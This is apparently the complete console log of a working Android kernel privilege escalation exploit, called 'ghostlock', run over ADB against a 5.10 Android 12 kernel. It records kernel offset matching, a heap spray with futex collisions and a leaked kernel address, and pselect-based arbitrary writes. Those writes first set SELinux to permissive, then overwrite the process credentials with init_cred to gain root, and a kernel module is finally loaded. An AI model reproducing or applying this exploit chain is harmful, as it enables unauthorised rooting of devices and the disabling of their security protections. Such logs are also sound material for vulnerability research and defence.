[33m[*] [0mreserved 128 low fds (later allocations start above 130)
[33m[*] [0mcpu pair: main=4 consumer=5
[33m[*] [0mruntime home=/data/local/tmp script=/data/local/tmp/.ghostlock_root.sh
[33m[*] [0mkernel: 5.10.149-android12-9-00001-gda3d81545d1d-ab9545656
[33m[*] [0mno external offsets match at /data/local/tmp/offsets.json
[32m[+] [0moffsets matched: 5.10.149-android12-9-00001-gda3d81545d1d-ab9545656
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc0827a0930 alias=ffffff802a7a0930
[32m[+] [0mstartup context pid=8996 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=8996 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=8996 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=8996 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802a781450 bootid_data=ffffff802aa4933d init_task=ffffff802a78bf80 root_tg=ffffff802a980040 sysctl_bootid=ffffff802aa4933d
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=4
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+0ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/15
[33m[*] [0m=== W1: SELinux === target=0xffffff802aa2fb98 mode=1 leaf=0
[33m[*] [0m[T+39ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +60ms
[33m[*] [0m[spray] finding futex collisions... +156ms
[33m[*] [0m[spray] futex collisions found +374ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88720bcec0 +599ms
[33m[*] [0mDBG-W2 mode=1 child=1 fake_right=ffffff88720b8100 fake_fops=ffffff88720b8100 fake_parent=ffffff802aa2fb90 target=ffffff802aa2fb98
[33m[*] [0m[spray] payload ready +600ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +639ms
[33m[*] [0m[T+678ms]   heap spray done
[33m[*] [0mconsumer thread running on cpu=5
[33m[*] [0mDBG-PSELECT 5.10 fake_right=ffffff88720b8100 fake_fops=ffffff88720b8100 target=ffffff802aa2fb98 pselect_custom_write=1
[33m[*] [0mpselect shift override: -2
[33m[*] [0mpselect route setup shift=-2 page=ffffff88720b8000 fake_lock=ffffff88720b8000 fake_w0=ffffff88720b8300 fake_task=ffffff88720b8400 in0=ffffff88720b8100 in3=ffffff88720b8100 out0=ffffff802aa2fb98 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select compact=1 +0ms
[33m[*] [0mpselect post-select compact=1 +201ms ret=4
[33m[*] [0mpselect returned ret=4 errno=0 calls=1 success=1 delay=50000
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+2881ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0m[T+2982ms] Write 1 complete
[33m[*] [0m[T+3022ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff88dd773780 (1570/8192 votes)
[33m[*] [0mperf task: 0xffffff88dd773780 (1542/8192 votes)
[33m[*] [0mperf task: 0xffffff88dd773780 (1552/8192 votes)
[33m[*] [0m[T+3539ms] perf_find_task done
[33m[*] [0mchild_pid=10596 child_task=0xffffff88dd773780
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mperf task: 0xffffff87f559dc80 (1552/8192 votes)
[33m[*] [0mperf task: 0xffffff87f559dc80 (1550/8192 votes)
[33m[*] [0mperf task: 0xffffff87f559dc80 (1556/8192 votes)
[33m[*] [0mSELF-W2: my_task=ffffff87f559dc80 cred_target=ffffff87f559e400
[33m[*] [0mSELF-W2: cred attempt 1/15
[33m[*] [0m=== SELF-W2: cred === target=0xffffff87f559e400 mode=2 leaf=0
[33m[*] [0m[T+4101ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +60ms
[33m[*] [0m[spray] finding futex collisions... +161ms
[33m[*] [0m[spray] futex collisions found +415ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88cec60000 +580ms
[33m[*] [0mDBG-W2 mode=2 child=1 fake_right=ffffff802a7a0930 fake_fops=ffffff802a7a0930 fake_parent=ffffff87f559e3f8 target=ffffff87f559e400
[33m[*] [0m[spray] payload ready +581ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +621ms
[33m[*] [0m[T+4722ms]   heap spray done
[33m[*] [0mconsumer thread running on cpu=5
[33m[*] [0mDBG-PSELECT 5.10 fake_right=ffffff802a7a0930 fake_fops=ffffff802a7a0930 target=ffffff87f559e400 pselect_custom_write=2
[33m[*] [0mpselect route setup shift=-2 page=ffffff88cec60000 fake_lock=ffffff88cec60000 fake_w0=ffffff88cec60300 fake_task=ffffff88cec60400 in0=ffffff802a7a0930 in3=ffffff802a7a0930 out0=ffffff87f559e400 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select compact=1 +0ms
[33m[*] [0mpselect post-select compact=1 +200ms ret=1
[33m[*] [0mpselect returned ret=1 errno=0 calls=1 success=1 delay=50000
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+6924ms]   PI route done
[32m[+] [0mself is root (uid 0)!
[32m[+] [0mSELF-W2 root; probing post-root state
[33m[*] [0mSELF-W2 probe: uid=0 euid=0 gid=-178658304
[33m[*] [0mSELF-W2 probe: open=131 errno=0
[33m[*] [0mSELF-W2 probe: write=6 errno=0
[33m[*] [0mSELF-W2 probe: open(/sdcard)=131 errno=0
[32m[+] [0mSELF-W2 root; loading module IN-PROCESS
[33m[*] [0mSELF-W2: relocate+init_module rc=0
[33m[*] [0mSELF-W2: module_loaded=1
[33m[*] [0mSELF-W2: result file wrote 21 bytes
[32m[+] [0mSELF-W2 done (module should be live)
[33m[*] [0mSELF-W2: script size=11395 head=[#!/system/bin/sh
HOM]
[32m[+] [0mSELF-W2: done, module live
ADB_EXIT=0
